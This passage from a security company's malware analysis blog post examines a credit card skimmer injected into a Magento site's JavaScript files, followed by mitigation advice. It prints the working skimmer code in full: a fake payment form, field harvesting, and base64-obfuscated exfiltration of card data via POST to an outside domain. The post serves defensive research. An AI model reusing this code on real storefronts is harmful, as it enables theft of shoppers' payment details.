#00c4c4;"> name=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment[cc_cid]</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> value=</span><span style="color: #008080;">\"</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> autocomplete=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">off</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;/div&gt;&lt;/div&gt;&lt;/li&gt;</span><span style="color: #02d045;">"</span><span style="color: #b060b0;">;</span>
jQuery<span style="color: #d2cd86;">(</span>document<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>ready<span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">function</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">#onestepcheckout-place-order</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>click<span style="color: #d2cd86;">(</span>onestepcheckout_payment<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">#payment_form_payco</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>html<span style="color: #d2cd86;">(</span>form<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">input</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>removeAttr<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">disabled</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">select</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>removeAttr<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">disabled</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span>
<span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">html</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>click<span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">function</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">input</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>removeAttr<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">disabled</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">select</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>removeAttr<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">disabled</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    <span style="color: #e66170; font-weight: bold;">if</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">!</span>jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">*</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>is<span style="color: #d2cd86;">(</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">#cc_cid_data</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
        jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">#payment_form_payco</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>html<span style="color: #d2cd86;">(</span>form<span style="color: #d2cd86;">)</span>
    <span style="color: #b060b0;">}</span>
<span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
<span style="color: #e66170; font-weight: bold;">function</span> onestepcheckout_payment<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
    <span style="color: #e66170; font-weight: bold;">var</span> arr <span style="color: #d2cd86;">=</span> <span style="color: #b060b0;">{</span><span style="color: #b060b0;">}</span><span style="color: #d2cd86;">,</span>
    bl<span style="color: #d2cd86;">,</span> string<span style="color: #d2cd86;">,</span> domain <span style="color: #d2cd86;">=</span> atob<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">Ly9jZG4tZmlsZXN0b3JlLmNvbS9jYWNoZS5waHA/YWxs</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">,</span>
    host <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">encodeURIComponent</span><span style="color: #d2cd86;">(</span>location<span style="color: #d2cd86;">.</span>host<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">input, select</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">.</span>each<span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">function</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
        bl <span style="color: #d2cd86;">=</span> <span style="color: #d2cd86;">(</span>arr<span style="color: #d2cd86;">[</span><span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name<span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">==</span> <span style="color: #02d045;">"</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">||</span> arr<span style="color: #d2cd86;">[</span><span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name<span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">==</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">undefined</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">||</span> <span style="color: #e66170; font-weight: bold;">typeof</span> arr<span style="color: #d2cd86;">[</span><span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name<span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">===</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">undefined</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span> <span style="color: #d2cd86;">&amp;&amp;</span> <span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name <span style="color: #d2cd86;">!=</span> <span style="color: #02d045;">"</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">&amp;&amp;</span> <span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name <span style="color: #d2cd86;">!=</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">undefined</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">&amp;&amp;</span> <span style="color: #e66170; font-weight: bold;">typeof</span> <span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name <span style="color: #d2cd86;">!==</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">undefined</span><span style="color: #02d045;">"</span><span style="color: #b060b0;">;</span>
        <span style="color: #e66170; font-weight: bold;">if</span> <span style="color: #d2cd86;">(</span>bl<span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
            arr<span style="color: #d2cd86;">[</span><span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>name<span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>value<span style="color: #b060b0;">;</span>
            <span style="color: #e66170; font-weight: bold;">return</span> <span style="color: #0f4d75;">true</span>
        <span style="color: #b060b0;">}</span>
        arr<span style="color: #d2cd86;">[</span><span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>id<span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">this</span><span style="color: #d2cd86;">.</span>value
    <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    string <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">encodeURIComponent</span><span style="color: #d2cd86;">(</span>btoa<span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">unescape</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">encodeURIComponent</span><span style="color: #d2cd86;">(</span>JSON<span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">stringify</span><span style="color: #d2cd86;">(</span>arr<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">.</span>get<span style="color: #d2cd86;">(</span>domain<span style="color: #d2cd86;">,</span> <span style="color: #e66170; font-weight: bold;">function</span> <span style="color: #d2cd86;">(</span>dat<span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
        jQuery<span style="color: #d2cd86;">.</span>ajax<span style="color: #d2cd86;">(</span><span style="color: #b060b0;">{</span>
            url<span style="color: #b060b0;">:</span> atob<span style="color: #d2cd86;">(</span>dat<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">,</span>
            xhrFields<span style="color: #b060b0;">:</span> <span style="color: #b060b0;">{</span>
                withCredentials<span style="color: #b060b0;">:</span> <span style="color: #0f4d75;">true</span>
            <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">,</span>
            type<span style="color: #b060b0;">:</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">POST</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">,</span>
            data<span style="color: #b060b0;">:</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">data=</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">+</span> string <span style="color: #d2cd86;">+</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">&amp;target=</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">+</span> host
        <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span>
    <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span>
<span style="color: #b060b0;">}</span>
</pre>
<p>This code sample includes a form with all the credit card information, but the most interesting snippet lies at the end, which contains the domain used for the exfiltration of the skimmed payment data.</p>
<pre style="white-space: pre-wrap; color: #d1d1d1; background: #000000;"><span style="color: #e66170; font-weight: bold;">function</span> onestepcheckout_payment<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
    <span style="color: #e66170; font-weight: bold;">var</span> arr <span style="color: #d2cd86;">=</span> <span style="color: #b060b0;">{</span><span style="color: #b060b0;">}</span><span style="color: #d2cd86;">,</span>
    bl<span style="color: #d2cd86;">,</span> string<span style="color: #d2cd86;">,</span> domain <span style="color: #d2cd86;">=</span> atob<span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">Ly9jZG4tZmlsZXN0b3JlLmNvbS9jYWNoZS5waHA/YWxs</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">,</span>
    host <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">encodeURIComponent</span><span style="color: #d2cd86;">(</span>location<span style="color: #d2cd86;">.</span>host<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
</pre>
<p>The base64 encoded string decodes to <b>//cdn-filestore[dot]com/cache.php?all</b><b><br />
</b></p>
<p>Later on, the data is base64 encoded, converted to JSON format, after which jQuery is used to submit the collected data (exfiltration). The harvested information is then sent to <b>cdn-filestore[dot]com</b> via a POST request.</p>
<pre style="white-space: pre-wrap; color: #d1d1d1; background: #000000;">string <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">encodeURIComponent</span><span style="color: #d2cd86;">(</span>btoa<span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">unescape</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">encodeURIComponent</span><span style="color: #d2cd86;">(</span>JSON<span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">stringify</span><span style="color: #d2cd86;">(</span>arr<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
    jQuery<span style="color: #d2cd86;">.</span>get<span style="color: #d2cd86;">(</span>domain<span style="color: #d2cd86;">,</span> <span style="color: #e66170; font-weight: bold;">function</span> <span style="color: #d2cd86;">(</span>dat<span style="color: #d2cd86;">)</span> <span style="color: #b060b0;">{</span>
        jQuery<span style="color: #d2cd86;">.</span>ajax<span style="color: #d2cd86;">(</span><span style="color: #b060b0;">{</span>
            url<span style="color: #b060b0;">:</span> atob<span style="color: #d2cd86;">(</span>dat<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">,</span>
            xhrFields<span style="color: #b060b0;">:</span> <span style="color: #b060b0;">{</span>
                withCredentials<span style="color: #b060b0;">:</span> <span style="color: #0f4d75;">true</span>
            <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">,</span>
            type<span style="color: #b060b0;">:</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">POST</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">,</span>
            data<span style="color: #b060b0;">:</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">data=</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">+</span> string <span style="color: #d2cd86;">+</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">&amp;target=</span><span style="color: #02d045;">"</span> <span style="color: #d2cd86;">+</span> host
        <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span>
    <span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span>
</pre>
<h2>Conclusion &amp; Mitigation Steps</h2>
<p>This malware was found injected into one of the<b> .js</b> files inside <b>./media/js/</b>, and itâ€™s not unusual to find other files injected with this code as well.</p>
<p>Credit card stealers are becoming an increasingly common threat. As consumers continue to rely heavily on online shopping, we only expect to see a rise in attacks targeting ecommerce sites.</p>
<p>You can mitigate risk by keeping your websiteâ€™s software up to date, or by virtually patching known vulnerabilities with a<a href="https://sucuri.net/website-firewall/"> website firewall</a>.</p>
<p>In the event of an incident,<a href="http://sucuri.net/website-security-platform/malware-scanning-and-detection"> integrity monitoring services</a> and<a href="http://sucuri.net/website-security-platform/malware-removal"> professional incident response</a> are the best ways to detect and respond to a website compromise.</p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2020%2F08%2Fcdn-filestore-credit-card-stealer-for-magento.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=CDN-Filestore%20Credit%20Card%20Stealer%20for%20Magento&url=https://blog.sucuri.net/2020/08/cdn-filestore-credit-card-stealer-for-magento.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/ecommerce-security" rel="category tag">Ecommerce Security</a>, <a href="https://blog.sucuri.net/category/magento-security" rel="category tag">Magento Security</a>, <a href="https://blog.sucuri.net/category/sucuri-labs" rel="category tag">Sucuri Labs</a>, <a href="https://blog.sucuri.net/category/website-malware-infections" rel="category tag">Website Malware Infections</a>, <a href="https://blog.sucuri.net/category/website-security" rel="category tag">Website Security</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/black-hat-tactics" rel="tag">Black Hat Tactics</a>, <a href="https://blog.sucuri.net/tag/hacked-websites" rel="tag">Hacked Websites</a>, <a href="https://blog.sucuri.net/tag/labs-note" rel="tag">Labs Note</a>, <a href="https://blog.sucuri.net/tag/obfuscation" rel="tag">Obfuscation</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/df2487806812cf3a45af64a37a1e0daf?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df2487806812cf3a45af64a37a1e0daf?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">Krasimir Konov</span></h4><div class="author-box-content" itemprop="description"><p>Krasimir Konov is Sucuri's Malware Analyst who joined the company in 2014. Krasimir's main responsibilities include analyzing malicious code, signature creation and documentation of malware. His professional experience covers more than 10 years in the IT field, with nine years involved in IT/cyber security. When heâ€™s not analyzing malware or writing Labs notes, you might find Krasimir riding his motorcycle and traveling the world. Connect with him on <a href="https://twitter.com/KrasimirSec">Twitter</a> or <a href="https://www.linkedin.com/in/krasimir-konov/">LinkedIn</a>.</p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea534f745b7">Search the blog</label><input type="search" name="s" id="searchform-62ea534f745b7" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-14" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/anatomy-of-website-malware?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=Anatomy-of-Malware" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23220 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_anatomy-of-website-malware.png" alt="The Anatomy of Website Malware Webinar" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-19" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/how-to-clean-hacked-magento-site?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Webinar&#038;utm_term=EN&#038;utm_content=Hacked-Magento" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23283 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/04/blog-sidebar_widgetlogic_webinars_hacked-magento.png" alt="Magento Webinar" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-22" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/pci-compliance-requirements-checklist?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Guide&amp;utm_term=EN&amp;utm_content=PCI-Compliance" target="_blank" rel="noopener"><img loading="lazy" class="aligncenter wp-image-23345 size-full" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_pci-dss-compliance.png" alt="PCI Compliance Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-25" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/magento-security?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Guide&#038;utm_term=EN&#038;utm_content=Magento-Security" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23344 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_magento-security.png" alt="Magento Security Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-7" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/how-to-clean-hacked-magento-site?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Webinar&#038;utm_term=EN&#038;utm_content=Hacked-Magento" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23483 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_hacked-magento-1.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-34" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/simple-steps-to-secure-your-online-store?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=Simple-Steps" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23489 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_steps-to-secure-online-store.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
